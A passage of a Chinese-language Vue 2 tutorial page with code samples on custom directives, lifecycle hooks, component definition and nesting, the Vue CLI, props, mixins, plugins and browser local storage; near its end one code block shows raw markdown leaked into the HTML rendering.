title="自定义指令"></a>自定义指令</h3><p><strong>语法：</strong></p><ul><li><p><strong>局部指令</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">directives</span>:&#123;<br>    指令名(element,binding)&#123;<br>    &#125;<br>  &#125;)<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">directives</span>:&#123;指令名：配置对象&#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p><strong>定义全局指令</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(<span class="hljs-string">&#x27;指令名称&#x27;</span>,配置对象）<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(<span class="hljs-string">&#x27;指令名称&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">element,binding</span>)&#123;<br>&#125;)<br></code></pre></td></tr></table></figure></li></ul><p>配置对象中<strong>常用的三个回调</strong>：</p><ul><li><strong>bind</strong>：指令与元素成功绑定时调用</li><li><strong>inserted</strong>：指令所在元素被插入页面时调用</li><li><strong>update</strong>：指令所在的模板被重新解析</li></ul><p>备注：</p><ul><li>指令定义名称时不加v-，使用时需添加</li><li>指令名若是多个单词，要使用kebab-case命名法。不要用camelCase命名。</li></ul><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>生命周期：Vue在关键时刻帮我们调用的一些特殊名称的函数。</p><ul><li>生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。</li><li>生命周期函数中的<strong>this指向的是vm 或 组件实例对象</strong>。</li><li>【<a href="https://v2.cn.vuejs.org/images/lifecycle.png">生命周期图示</a>】</li></ul><blockquote><p>每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做<strong>生命周期钩子</strong>的函数，这给了用户在不同阶段添加自己的代码的机会。</p></blockquote><p><strong>生命周期钩子</strong></p><ol><li><p>初始化</p><ul><li>beforeCreate —— 将要创建</li><li>created ——创建完毕</li></ul></li><li><p>挂载</p><ul><li>beforeMount —— 将要挂载</li><li><strong>mounted</strong> —— 挂载完毕<ul><li>发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作</li></ul></li></ul></li><li><p>更新</p><ul><li>beforeUpdate —— 将要更新</li><li>updated —— 更新完毕</li></ul></li><li><p>销毁</p><ul><li>beforeDestroy —— 将要销毁<ul><li>清除定时器、解绑自定义时间、取消订阅信息等收尾工作</li></ul></li><li>destroyed —— 销毁完毕</li></ul><p>销毁后借助Vue开发者工具看不到任何信息。自定义事件会失效，但原生DOM事件依然有效。</p></li></ol><p>vm.$destroy ：触发 beforeDestroy 和 destroyed 的 效果。</p><h1 id="第二章：Vue组件化编程"><a href="#第二章：Vue组件化编程" class="headerlink" title="第二章：Vue组件化编程"></a>第二章：Vue组件化编程</h1><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>传统编写应用存在的问题：</p><ul><li>依赖关系混乱，不太好维护</li><li>代码复用率不高</li></ul><p><strong>组件</strong>：实现应用中<strong>局部</strong>功能的<strong>代码和资源</strong>的<strong>集合</strong>。</p><ul><li><strong>非单文件组件</strong>：一个文件中包含有n个组件。</li><li><strong>单文件组件</strong>：一个文件中只包含有1个组件。</li></ul><p><strong>模块</strong>：向外<strong>提供特定功能</strong>的<strong>js程序</strong>，一般就是一个js文件。</p><p><strong>模块化</strong>：当应用中的js都以模块来编写，那这个应用就是一个模块化的应用。</p><img src="https://v2.cn.vuejs.org/images/components.png" alt="组件的组织"><p>使用组件三步骤：创建(定义) &#x3D;》注册 &#x3D;》使用</p><ul><li><p>定义</p><p>使用**<code>Vue.extend(options)</code>**创建。options和Vue(options)时传入的options几乎一致，但也有区别：</p><ul><li><strong>不写el</strong>，因为最终所有组件都要经过一个vm的管理，由vm中的el决定服务于哪个容器。</li><li><strong>data必须写成函数</strong>，避免组件被复用。</li></ul><p>可使用template配置组件结构。</p></li><li><p>注册</p><ol><li><strong>局部注册</strong>：<code>new Vue</code>时<strong>传入components选项</strong></li><li><strong>全局注册</strong>：**<code>Vue.component(&#39;组件名&#39;,组件)</code>**</li></ol></li><li><p>使用</p><p>编写组件标签，如<code>&lt;school&gt;&lt;/school</code>。</p></li><li><p>关于组件名的推荐写法：</p><ul><li><p>一个单词组成：首字母大写或首字母小写</p></li><li><p>多个单词组成：kebab-case命名、CamelCase命名（需要Vue脚手架支持）</p></li></ul><p>起名尽可能会比HTML中已有的元素名称。</p><p>可以使用name配置项指定组件在开发者工具中呈现的名字。</p></li><li><p>关于组件标签：</p><ul><li><p>写法一：双标签 <code>&lt;school&gt;&lt;/school&gt;</code></p></li><li><p>写法二：自闭和 <code>&lt;school /&gt;</code> （需要Vue脚手架）</p></li></ul></li><li><p>一个简写方式：</p><p><code>const school = Vue.extend(options)</code> 可简写为 <code>const school = options</code></p></li></ul><h2 id="组件嵌套（案例）"><a href="#组件嵌套（案例）" class="headerlink" title="组件嵌套（案例）"></a>组件嵌套（案例）</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-28%20%E4%B8%8B%E5%8D%8810.10.09.png" alt="案例效果" style="zoom:33%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 容器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    // student组件</span></span><br><span class="language-xml"><span class="language-handlebars">        const student = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        name:&#x27;student&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>年龄：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        `,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                name:&#x27;张三&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                age:18</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars">    // school组件</span></span><br><span class="language-xml"><span class="language-handlebars">    const school = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        name:&#x27;school&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>地址：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        `,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                name:&#x27;尚硅谷&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                address:&#x27;北京&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">        components:&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            student</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars">    // hello组件</span></span><br><span class="language-xml"><span class="language-handlebars">    const hello = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">msg</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        `,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                msg:&#x27;欢迎&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars">    // app组件 (管理组件)</span></span><br><span class="language-xml"><span class="language-handlebars">    const app = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        `,</span></span><br><span class="language-xml"><span class="language-handlebars">        components:&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            school,</span></span><br><span class="language-xml"><span class="language-handlebars">            hello</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    // 创建vm</span></span><br><span class="language-xml"><span class="language-handlebars">    new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">app</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">app</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        `,</span></span><br><span class="language-xml"><span class="language-handlebars">        el:&#x27;#root&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">        // 注册组件</span></span><br><span class="language-xml"><span class="language-handlebars">        components:&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            app</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>app是管理所有组件的组件。</p><h2 id="关于VueComponent"><a href="#关于VueComponent" class="headerlink" title="关于VueComponent"></a>关于VueComponent</h2><p>school组件（见之前案例）本质是<strong>一个名为VueComponent的构造函数</strong>。不是程序员定义，而是Vue.extend生成的。</p><p>我们只需写<code>&lt;school /&gt;</code>或者<code>&lt;school&gt;&lt;/school&gt;</code>,Vue解析时会帮我们创建school组件的实例对象（即执行<code>new VueComponent(options)</code>）。</p><p><strong>注意：每次调用<code>Vue.extend</code>时，返回的都是一个全新的VueComponent。</strong></p><p>关于<strong>this指向</strong>：</p><ul><li><p><strong>组件配置中</strong>：</p><p>data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是<strong>VueComponent实例对象</strong>。</p></li><li><p><strong>new Vue(options) 配置中</strong>：</p><p>data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是<strong>Vue实例对象</strong>。</p></li></ul><p><strong>VueComponent.prototype.proto &#x3D;&#x3D;&#x3D; Vue.prototype</strong></p><h2 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h2><p>一个.vue文件的组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;!-- 页面模板 --&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>  //组件交互相关的代码<br>export default &#123;<br><br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>/*样式*/<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><h1 id="第三章：使用Vue脚手架"><a href="#第三章：使用Vue脚手架" class="headerlink" title="第三章：使用Vue脚手架"></a>第三章：使用Vue脚手架</h1><p>Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。</p><p>官方文档：<a href="https://cli.vuejs.org/zh/">https://cli.vuejs.org/zh/</a></p><p>切换淘宝镜像：<code>npm config set registry https://registry.npm.taobao.org</code></p><p>模板分析：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">├── node_modules <br>├── public <br>│ ├── favicon<span class="hljs-selector-class">.ico</span>: 页签图标 <br>│ └── index<span class="hljs-selector-class">.html</span>: 主页面 <br>├── <span class="hljs-attribute">src</span> <br>│ ├── assets: 存放静态资源 <br>│ │ └── logo<span class="hljs-selector-class">.png</span> <br>│ │── component: 存放组件 <br>│ │ └── HelloWorld<span class="hljs-selector-class">.vue</span> <br>│ │── App<span class="hljs-selector-class">.vue</span>: 汇总所有组件 <br>│ │── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span>: 入口文件 <br>├── <span class="hljs-selector-class">.gitignore</span>: git 版本管制忽略的配置 <br>├── babel<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.js</span>: babel 的配置文件 <br>├── package<span class="hljs-selector-class">.json</span>: 应用包配置文件 <br>├── README<span class="hljs-selector-class">.md</span>: 应用描述文件 <br>├── package-lock.json：包版本控制文件<br></code></pre></td></tr></table></figure><p>main.js 引入的vue为精简版（没有模板解析器），而不是完整版。</p><ul><li><code>vue.js</code> 是完整版的Vue。包含：核心功能+模板解析器</li><li><code>vue.runtime.xxx.js</code>是运行版的Vue。只包含：核心功能，没有模板解析器<ul><li>所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容</li></ul></li></ul><p>使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。</p><p>使用<strong>vue.config.js</strong>可以对脚手架进行个性化定制，详情见：<a href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></p><ul><li><strong><code>lintOnSave: false</code></strong> —— 关闭语法检查</li></ul><h2 id="render函数"><a href="#render函数" class="headerlink" title="render函数"></a>render函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vue">render: h =&gt; h(App),<br>//h为函数<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vue">render(createElement) &#123;<br>return createElement(&#x27;h1&#x27;,&#x27;你好啊&#x27;)<br>&#125;,<br><br>// 不使用this所以可缩写，等同于<br>render:createElement =&gt; createElement(&#x27;h1&#x27;,&#x27;你好啊&#x27;)<br></code></pre></td></tr></table></figure><h2 id="rel属性"><a href="#rel属性" class="headerlink" title="rel属性"></a>rel属性</h2><ol><li>被用来给元素或子组件<strong>注册引用信息</strong>（id的替代者）</li><li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ol><li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li><li>获取：<code>this.$refs.xxx</code></li></ol></li></ol><h2 id="props配置项"><a href="#props配置项" class="headerlink" title="props配置项"></a>props配置项</h2><ul><li><p><strong>功能：让组件接收外部传过来的数据</strong>。</p></li><li><p>传递数据：<code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p></li><li><p>接收数据</p><ol><li><p>第一种方法（简单接收）：<code>props:[&#39;name&#39;,&#39;sex&#39;,&#39;age&#39;]</code></p></li><li><p>第二种方法（限制类型）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">props</span>:&#123;<br>  <span class="hljs-attr">name</span>:<span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>:<span class="hljs-title class_">Number</span>,<br>  <span class="hljs-attr">sex</span>:<span class="hljs-title class_">String</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">props</span>:&#123;<br>    <span class="hljs-attr">name</span>:&#123;<br>        <span class="hljs-attr">type</span>:<span class="hljs-title class_">String</span>,<br>        <span class="hljs-attr">required</span>:<span class="hljs-literal">true</span> <span class="hljs-comment">//是必要的</span><br>    &#125;,<br>    <span class="hljs-attr">age</span>:&#123;<br>        <span class="hljs-attr">type</span>:<span class="hljs-title class_">Number</span>,<br>        <span class="hljs-attr">default</span>:<span class="hljs-number">99</span><br>    &#125;,<br>    <span class="hljs-attr">sex</span>:&#123;<br>        <span class="hljs-attr">type</span>:<span class="hljs-title class_">String</span>,<br>        <span class="hljs-attr">required</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ul><blockquote><p>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p></blockquote><p>props适用于：</p><ul><li>父组件 给 子组件 通信</li><li>子组件 给 父组件 通信 （要求父先给子一个函数）</li></ul><p>注意：</p><ul><li>使用v-mode时切记<strong>，v-model绑定的值不能是props传过来的值</strong>。</li><li><strong>不推荐</strong>使用props修改传过来的 对象类型 值中的 属性</li></ul><h2 id="mixin（混入）"><a href="#mixin（混入）" class="headerlink" title="mixin（混入）"></a>mixin（混入）</h2><p><strong>功能：可以把多个组件公用的配置提取成一个混入对象。</strong></p><p>使用方式：</p><ul><li><p>定义混合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;....&#125;,<br>    <span class="hljs-attr">methods</span>:&#123;....&#125;<br>    ....<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用混合</p><ul><li>全局混入：<code>Vue.mixin(xxx)</code></li><li>局部混入：<code>mixins:[&#39;xxx&#39;]</code></li></ul></li></ul><h2 id="插件plugin"><a href="#插件plugin" class="headerlink" title="插件plugin"></a>插件plugin</h2><p>功能：用于<strong>增强Vue</strong></p><p>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p><p>定义插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">对象.<span class="hljs-property">install</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">Vue, options</span>) &#123;<br>    <span class="hljs-comment">// 1. 添加全局过滤器</span><br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">filter</span>(....)<br><br>    <span class="hljs-comment">// 2. 添加全局指令</span><br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(....)<br><br>    <span class="hljs-comment">// 3. 配置全局混入(合)</span><br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">mixin</span>(....)<br><br>    <span class="hljs-comment">// 4. 添加实例方法</span><br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$myMethod</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;...&#125;<br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$myProperty</span> = xxxx<br>&#125;<br></code></pre></td></tr></table></figure><p>使用插件：<code>Vue.use()</code></p><h2 id="scoped样式"><a href="#scoped样式" class="headerlink" title="scoped样式"></a>scoped样式</h2><ol><li>作用：<strong>让样式在局部生效，防止冲突。</strong></li><li>写法：<code>&lt;style scoped&gt;</code></li></ol><h2 id="组件化编码流程"><a href="#组件化编码流程" class="headerlink" title="组件化编码流程"></a>组件化编码流程</h2><ol><li>拆分静态组件：按功能点拆分，命名不要与html元素冲突</li><li>实现动态组件：考虑好数据的存放位置（数据是一个组件在用，还是一些组件在用）<ol><li>一个组件在用：放在组件自身</li><li>多个组件在用：放在它们共同的父组件（<strong>状态提升</strong>）</li></ol></li><li>实现交互：从绑定事件开始</li></ol><h2 id="浏览器本地存储"><a href="#浏览器本地存储" class="headerlink" title="浏览器本地存储"></a>浏览器本地存储</h2><p>存储内容大小一般支持5MB左右（具体见浏览器）。</p><p>浏览器端通过 <strong>Window.sessionStorage</strong> 和 <strong>Window.localStorage</strong> 属性来实现本地存储机制。</p><ul><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失。</li><li>LocalStorage存储的内容，需要手动清除才会消失。</li></ul><p>相关API：</p><ol><li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);</code><br>该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</p></li><li><p><code>xxxxxStorage.getItem(&#39;person&#39;);</code></p><p>该方法接受一个键名作为参数，返回键名对应的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。"><br>3. `xxxxxStorage.removeItem(&#x27;key&#x27;);`<br><br>   该方法接受一个键名作为参数，并把该键名从存储中删除。<br><br>4. ` xxxxxStorage.clear()`<br><br>   该方法会清空存储中的所有数据。<br><br><br><br>## 组件自定义事件<br><br>1. 一种组件通信的方式，适用于 **子组件 ===》 父组件**<br><br>2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（&lt;span style=&quot;color:red&quot;&gt;**事件的回调在A中**&lt;/span&gt;）。<br><br>3. 绑定自定义事件<br><br>   1. 第一种方式，在父组件中：<br><br>      `&lt;Demo @atguigu=&quot;test&quot;/&gt;`  或 `&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;`<br><br>   2. 第二种方式，在父组件中：<br><br>      ```js<br>      &lt;Demo ref=&quot;demo&quot;/&gt;<br>      ......<br>      mounted()&#123;<br>         this.$refs.xxx.$on(&#x27;atguigu&#x27;,this.test)<br>      &#125;<br></code></pre></td></tr></table></figure><ol 